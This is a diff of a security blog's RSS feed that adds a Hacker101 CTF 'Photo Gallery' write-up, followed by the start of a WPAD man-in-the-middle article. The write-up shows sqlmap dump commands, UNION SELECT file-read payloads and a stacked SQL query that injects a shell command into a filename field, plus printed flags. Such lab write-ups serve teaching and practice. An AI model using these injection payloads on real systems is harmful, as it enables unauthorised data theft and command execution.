@@ -1,4 +1,129 @@
-<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[dev.lwlx.xyz]]></title><description><![CDATA[Dev / Sec / Ops | Cybersecurity blog]]></description><link>https://dev.lwlx.xyz</link><image><url>https://dev.lwlx.xyz/icon.png</url><title>dev.lwlx.xyz</title><link>https://dev.lwlx.xyz</link></image><generator>RSS for Node</generator><lastBuildDate>Wed, 18 Nov 2020 21:44:50 GMT</lastBuildDate><atom:link href="https://dev.lwlx.xyz/rss.xml" rel="self" type="application/rss+xml"/><pubDate>Wed, 21 Oct 2020 04:00:00 GMT</pubDate><copyright><![CDATA[2020 lwlx.]]></copyright><language><![CDATA[en]]></language><managingEditor><![CDATA[lwlx@lwlx.xyz]]></managingEditor><webMaster><![CDATA[lwlx@lwlx.xyz]]></webMaster><ttl>60</ttl><item><title><![CDATA[MitM using WPAD Proxy Protocol:]]></title><description><![CDATA[<h4 id="thisarticleismarkedasaworkinprogresswip">this article is marked as a work in progress <code>[WIP]</code></h4>
+<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[dev.lwlx.xyz]]></title><description><![CDATA[Dev / Sec / Ops | Cybersecurity blog]]></description><link>https://dev.lwlx.xyz</link><image><url>https://dev.lwlx.xyz/icon.png</url><title>dev.lwlx.xyz</title><link>https://dev.lwlx.xyz</link></image><generator>RSS for Node</generator><lastBuildDate>Sun, 03 Jan 2021 17:56:57 GMT</lastBuildDate><atom:link href="https://dev.lwlx.xyz/rss.xml" rel="self" type="application/rss+xml"/><pubDate>Wed, 21 Oct 2020 04:00:00 GMT</pubDate><copyright><![CDATA[2021 lwlx.]]></copyright><language><![CDATA[en]]></language><managingEditor><![CDATA[lwlx@lwlx.xyz]]></managingEditor><webMaster><![CDATA[lwlx@lwlx.xyz]]></webMaster><ttl>60</ttl><item><title><![CDATA[Hacker101 CTF Photo Gallery writeup]]></title><description><![CDATA[<h1 id="photogallery_moderate_">Photo Gallery <em>[moderate]</em></h1>
+<p>This is my Write Up for the "Photo Gallery" challenge of HackerOne's CTF.</p>
+<p>As usual we get a link to webpage, it seems to be an image gallery, but one of the images is broken.
+The missing one is called <code>Invisible</code>, so lets look into that.</p>
+<pre><code>http://34.74.105.127/ad3e8c7df9/
+</code></pre>
+<p><img src="/hackerone/photogallery-start.png" alt="initial page" title="initial page" /></p>
+<h2 id="informationgathering">Information gathering</h2>
+<p>with Burp we were able to find that the server returns no content for this image.
+images are loaded with a <code>GET</code> Request to the server like so:</p>
+<p><code>GET /ad3e8c7df9/fetch?id=1 HTTP/1.1</code></p>
+<p>this also aligns with the first tip we are provided:</p>
+<blockquote>
+  <p>Hint 1: <em>Consider how you might build this system yourself. What would the <strong>query for fetch</strong> look like?</em></p>
+</blockquote>
+<p>naturally we start fuzzing the <code>id</code> parameter.</p>
+<pre><code class="python language-python">GET /ad3e8c7df9/fetch?id=4 HTTP/1.1 # 404
+GET /ad3e8c7df9/fetch?id=0 HTTP/1.1 # 404
+GET /ad3e8c7df9/fetch?id=-1 HTTP/1.1 # 500
+</code></pre>
+<p>alright, no quick wins, so let's give it a try with fizzing using sqlmap.
+Quickly we are able to see that the server seems to be vulnerable to some attack.</p>
+<pre><code class="python language-python">sqlmap -u "http://34.74.105.127/ad3e8c7df9/fetch?id=2"
+</code></pre>
+<p>This command runs for quite a while and will try to find vulnerabilities in the fetch endpoint.
+when we are done we should know what to do next.</p>
+<h2 id="gathereddata">Gathered Data</h2>
+<h3 id="sqlmapidentifiedthefollowinginjectionpointswithatotalof311httpsrequests">sqlmap identified the following injection point(s) with a total of 311 HTTP(s) requests:</h3>
+<pre><code class="python language-python">Parameter: id (GET)
+Type: boolean-based blind
+Title: AND boolean-based blind - WHERE or HAVING clause
+Payload: id=2 AND 3567=3567
+
+Type: time-based blind
+Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
+Payload: id=2 AND (SELECT 8480 FROM (SELECT(SLEEP(5)))KHRS)
+</code></pre>
+<pre><code class="python language-python">[21:44:44] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Ubuntu
+web application technology: Nginx 1.14.0
+back-end DBMS: MySQL &gt;= 5.0.12 (MariaDB fork)
+</code></pre>
+<h3 id="ourtargetserver">Our Target Server:</h3>
+<pre><code>| Type      | Service      | Version                  | Vulnerable?    |
+| --------- | ------------ | ------------------------ | -------------- |
+| OS        | Linux Ubuntu | ??                       | not focused    |
+| Webserver | Nginx        | 1.14.0                   | no             |
+| Database  | MySQL        | &gt;= 5.0.12 (MariaDB fork) | yes (id param) |
+</code></pre>
+<p>Good, we got something, we know the server is vulnerable to multiple vulnerabilities such as a 'boolean base blind'. We also found the Webserver is Nginx v1.14.0, which sadly has no usable vulnerabilities here. But with us now knowing the exact os and DB System used lets run sqlmap again with that info and see what we get.</p>
+<pre><code class="python language-python">sqlmap -u "http://34.74.105.127/ad3e8c7df9/fetch?id=2" -f --os=linux --dbms=mysql --level=3 -o
+</code></pre>
+<p>we dont really get any more useful information from here.
+soo.. were kinda stuck lets just get another hint then:</p>
+<blockquote>
+  <p>Hint 2: <em>Take a few minutes to consider the <strong>state of the union</strong></em></p>
+</blockquote>
+<p>The state uf the union? are they hinting on using UNION statements in the query?
+<em>The UNION operator is used to combine the result-set of two or more SELECT statements.</em>
+That seems like somethng we can make use of, so lets try and combine our query statements f.e. like this:</p>
+<p>http://34.74.105.127/ad3e8c7df9/fetch?id=2 UNION SELECT 'something'</p>
+<p>but what do we look for? Lets get another hint.</p>
+<blockquote>
+  <p>Hint 3: <em>This application runs on the <strong>uwsgi-nginx-flask-docker</strong> image</em></p>
+</blockquote>
+<p>uwsgi-nginx? hmm havent heard of that, but sems to be some kind of portable all in one flask. lets look for the docs.</p>
+<p>https://uwsgi-docs.readthedocs.io/en/latest/Configuration.html#ini-files</p>
+<blockquote>
+  <p>uWSGI can be configured using several different methods.</p>
+</blockquote>
+<p>YAML, JSON, INI are some supported formats -&gt; ini beeing the defualt so lets try getting the 'uwsgi.ini' file?</p>
+<p><img src="/hackerone/union-select-ini.png" alt="union select wiht burp repeater" title="union select wiht burp repeater" /></p>
+<p>this returns us some configdata pointing to module main which is the entrypoint.</p>
+<pre><code class="python language-python">[uwsgi]
+module = main
+callable = app
+</code></pre>
+<p>so lets see if we can also fethc the main.py</p>
+<pre><code class="python language-python">http://35.190.155.168/c947e97f6e/fetch?id=4%20UNION%20SELECT%20%27main.py%27--
+</code></pre>
+<p>Here we get lots of infos our <strong>first FLAG</strong> and the db connection settings:</p>
+<h3 id="flag0">FLAG 0:</h3>
+<pre><code class="python language-python">%s
+' % (pid, sanitize(ptitle)) fns.append(pfn) rep += 'Space used: ' + subprocess.check_output('du -ch %s || exit 0' % ' '.join('files/' + fn for fn in fns), shell=True, stderr=subprocess.STDOUT).strip().rsplit('\n', 1)[-1] + '' rep += '
+\n' return home.replace('$ALBUMS$', rep) @app.route('/fetch') def fetch(): cur = getDb().cursor() if cur.execute('SELECT filename FROM photos WHERE id=%s' % request.args['id']) == 0: abort(404)
+# It's dangerous to go alone, take this: # ^FLAG^9e6d57c394c129??????????????????????????????f74dbf2faa0abd571b32c7$FLAG$ return file('./%s' % cur.fetchone()[0].replace('..', ''), 'rb').read() if __name__ == "__main__": app.run(host='0.0.0.0', port=80)
+</code></pre>
+<p><code>return MySQLdb.connect(host="localhost", user="root", password="", db="level5")</code></p>
+<p>we also see that they are using the photos table</p>
+<p><code>cur.execute('SELECT id, title, filename FROM photos WHERE parent=%s LIMIT 3', (id, ))</code></p>
+<p>lets try to fuzz that with sqlmap, since we now know the DB and tables info we can launch a targeted attack.</p>
+<pre><code class="python language-python">sqlmap -u "http://34.74.105.127/ad3e8c7df9/fetch?id=1" --method=GET --dump -D level5 -T photos -p id, --code=200 --ignore-code=500 --skip-waf -o --threads 2
+</code></pre>
+<p>This can take quite a while.. for me it crashed after 40 minutes, so i gave it another go with just focusing on the column <code>filename</code> since, here is the value we need.we do this by adding the -C parameter, i also increased the thradcount to 4 to try and get faster results. I also changed the url to contain id=3 since this is the id we want to get the info from.</p>
+<pre><code class="python language-python">sqlmap -u "http://35.190.155.168/c947e97f6e/fetch?id=3" --method=GET --dump -D level5 -T photos -p id, --code=200 --ignore-code=500 --skip-waf -o --threads 4 -C filename
+</code></pre>
+<p>This means that swlmap will start with the filename of id=3 which is exactly what we want right now.</p>
+<p><img src="/hackerone/photo-gallery-hash.png" alt="starts to query filename of id 3" title="query on the filename of id 3" />
+So lets have a look at our results:</p>
+<pre><code class="python language-python">Database: level5
+Table: photos
+[3 entries]
++------------------------------------------------------------------+
+| filename |
++------------------------------------------------------------------+
+| 9ef8fc5da15625db993f1c8e120beafc6873d801a804670b9497ecc782ca11fa |
+| files/adorable.jpg |
+| files/purrfect.jpg |
++------------------------------------------------------------------+
+</code></pre>
+<blockquote>
+  <p>you might be getting partial values like so:
+  <code>9ef8fc5di15625db993f1c8e120beafc6873d801a804670?????????????????</code>
+  you should be able to re-run sqlmap to find the missing characters
+  <code>9ef8fc5da15625db993f1c8e120beafc6873d801a804670b9497ecc782ca11fa</code></p>
+</blockquote>
+<p>decrypted: <code>\*||+ls+-a+tmp.txt</code></p>
+<p>so we try this request:
+<code>GET /ad3e8c7df9/fetch?id=3\*||+ls+-a+tmp.txt</code></p>
+<p><code>GET /ad3e8c7df9/fetch?id=1;%20update%20photos%20set%20filename=%27\*%20||%20ls%20./files%20%3Etmp.txt%20%27%20where%20id=3;%20commit;%20-- HTTP/1.1</code></p>
+<p><code>GET /ad3e8c7df9/fetch?id=4 UNION SELECT 'temp.txt'-- HTTP/1.1</code></p>
+<pre><code class="bash language-bash">"^FLAG^9ef8fc5da15625db993f1c8e120beafc6873d801a804670b9497ecc782ca11fa$FLAG$"
+"^FLAG^63a407d0083bf2aedd862d762fcf96e8a7f8bf751e1ac24bec781a74564ee9f2$FLAG$"
+HOSTNAME=ad3e8c7df92d
+SHLVL=0
+</code></pre>]]></description><link>https://dev.lwlx.xyz/blog/blog/hacker101-ctf-photo-gallery</link><guid isPermaLink="true">https://dev.lwlx.xyz/blog/blog/hacker101-ctf-photo-gallery</guid><category><![CDATA[ctf]]></category><category><![CDATA[writeup]]></category><category><![CDATA[hackerone]]></category><category><![CDATA[hacker101]]></category><category><![CDATA[security]]></category><dc:creator><![CDATA[lwlx]]></dc:creator><pubDate>Sun, 03 Jan 2021 12:20:32 GMT</pubDate></item><item><title><![CDATA[MitM using WPAD Proxy Protocol:]]></title><description><![CDATA[<h4 id="thisarticleismarkedasaworkinprogresswip">this article is marked as a work in progress <code>[WIP]</code></h4>
 <h1 id="whatiswpad">What is WPAD?</h1>
 <p>Sometime in the early days of the Internet - the web 1.0 era - a couple of devs at Netscape decided that JavaScript was an acceptable language to write configuration files in. The result was Proxy Auto-Config (PAC) - a configuration file format that works as follows: The browser connects to a pre-configured server, downloads the PAC file, and executes a particular Javascript function to determine proper proxy configuration. Why not? It is more expressive and less tedious than XML and seems reasonable to provide configurations to many clients.</p>
 <p>PAC itself works with a protocol called Web Proxy Auto-Discovery (WPAD) WPAD removes the need for the browser or the user to have a pre-configured server to connect to. Instead, WPAD allows the computer to query the local network to discover the server to load the PAC file from.</p>
